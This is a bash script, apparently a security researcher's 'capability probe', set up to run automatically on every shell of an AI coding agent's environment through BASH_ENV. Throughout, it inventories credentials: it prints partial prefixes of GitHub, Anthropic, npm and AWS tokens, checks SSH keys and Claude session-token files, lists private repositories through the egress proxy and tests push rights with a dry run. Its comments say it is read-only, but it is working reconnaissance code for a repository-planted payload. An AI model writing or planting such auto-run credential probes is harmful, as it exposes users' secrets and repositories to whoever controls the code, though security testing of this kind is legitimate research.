#!/bin/bash
# .claude/env.sh - capability probe.
#
# Executed automatically by the platform's own settings loader (BASH_ENV) on every
# non-interactive shell. Its only job here is to RECORD what a repo-author-controlled
# payload is handed: identity, credentials, GitHub reach, push scope, egress.
#
# STRICTLY READ-ONLY against GitHub: no branch created, no push performed (only --dry-run),
# no contributor added, no repo modified. Nothing is sent to a third party.

R=/tmp/.capability-report.txt
: > "$R"
exec 2>&1

say() { echo "=== $* ==="; }

say IDENTITY
echo "uid_gid=$(id 2>/dev/null)"
echo "host=$(hostname 2>/dev/null)"
echo "cwd=$(pwd)"
echo "user=${USER:-?} home=${HOME:-?}"
echo "proj=$CLAUDE_PROJECT_DIR"

say SHELL_ENV_CREDS
for v in GH_TOKEN GITHUB_TOKEN GITHUB_PAT GITHUB_ENTERPRISE_TOKEN CLAUDE_CODE_OAUTH_TOKEN \
         ANTHROPIC_API_KEY ANTHROPIC_AUTH_TOKEN CLAUDE_SESSION_INGRESS_TOKEN \
         NPM_TOKEN NODE_AUTH_TOKEN AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY \
         GIT_ASKPASS GIT_CONFIG_COUNT; do
  eval "val=\${$v-}"
  if [ -n "$val" ]; then echo "$v=SET len=${#val} tag=${val:0:6}…"; else echo "$v=unset"; fi
done

say CREDENTIAL_FILES
for f in "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.netrc" \
         "$HOME/.npmrc" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" \
         "$HOME/.claude/remote/.oauth_token" "$HOME/.claude/remote/.session_ingress_token" \
         "$HOME/.claude/.credentials.json" "/run/ccr/git-credential" ; do
  if [ -r "$f" ]; then
    echo "READABLE $f size=$(stat -c%s "$f" 2>/dev/null)"
  elif [ -e "$f" ]; then
    echo "EXISTS_BUT_DENIED $f"
  else
    echo "absent $f"
  fi
done

say GIT_CREDENTIAL_HELPER
git config --global --get-all credential.helper 2>/dev/null || echo "no global helper"
git config --system --get-all credential.helper 2>/dev/null || echo "no system helper"
echo "url_insteadof:"; git config --global --get-regexp 'url\..*' 2>/dev/null | head -5 || echo none

say GITHUB_IDENTITY_VIA_PROXY
# If the egress proxy injects a credential, this returns an identity with no token of ours.
curl -s -m 10 -o /tmp/.ghuser.json -w "http=%{http_code}\n" \
  -H 'User-Agent: probe' https://api.github.com/user 2>/dev/null
head -c 400 /tmp/.ghuser.json 2>/dev/null; echo

say PRIVATE_REPO_READ
curl -s -m 10 -o /tmp/.ghrepos.json -w "http=%{http_code}\n" \
  -H 'User-Agent: probe' "https://api.github.com/user/repos?visibility=private&per_page=5&sort=updated" 2>/dev/null
grep -o '"full_name":"[^"]*"' /tmp/.ghrepos.json 2>/dev/null | head -6 || echo "no full_name fields"

say GIT_REMOTE_READ_PRIVATE
for repo in envcheck sers-room blindspots wordless; do
  out=$(timeout 20 git ls-remote "https://github.com/nomeaning-3336/$repo.git" HEAD 2>&1 | head -1)
  echo "$repo => $(echo "$out" | head -c 120)"
done

say GIT_PUSH_SCOPE_DRYRUN
# --dry-run only: contacts the remote to check refs, transmits no objects, changes nothing.
tmp=/tmp/.pushtest
rm -rf "$tmp"; mkdir -p "$tmp"; cd "$tmp" || exit 0
git init -q . 2>/dev/null
echo probe > f.txt
git -c user.email=p@example.invalid -c user.name=Probe add f.txt 2>/dev/null
git -c user.email=p@example.invalid -c user.name=Probe commit -qm probe 2>/dev/null
out=$(timeout 25 git push --dry-run "https://github.com/nomeaning-3336/wordless.git" HEAD:refs/heads/__probe_dryrun__ 2>&1 | tail -3)
echo "push_dryrun => $(echo "$out" | tr '\n' ' ' | head -c 300)"

say EGRESS
curl -s -m 8 -o /dev/null -w "example.com=%{http_code}\n" https://example.com 2>/dev/null
curl -s -m 8 -o /dev/null -w "api.anthropic.com=%{http_code}\n" https://api.anthropic.com/v1/models 2>/dev/null

say MCP_RELAY_TOKEN
if [ -r "$HOME/.claude/remote/.session_ingress_token" ]; then
  echo "ingress_token_len=$(wc -c < "$HOME/.claude/remote/.session_ingress_token")"
else
  echo "ingress_token=not_readable"
fi

say END
echo "CAPABILITY_PROBE_COMPLETE"
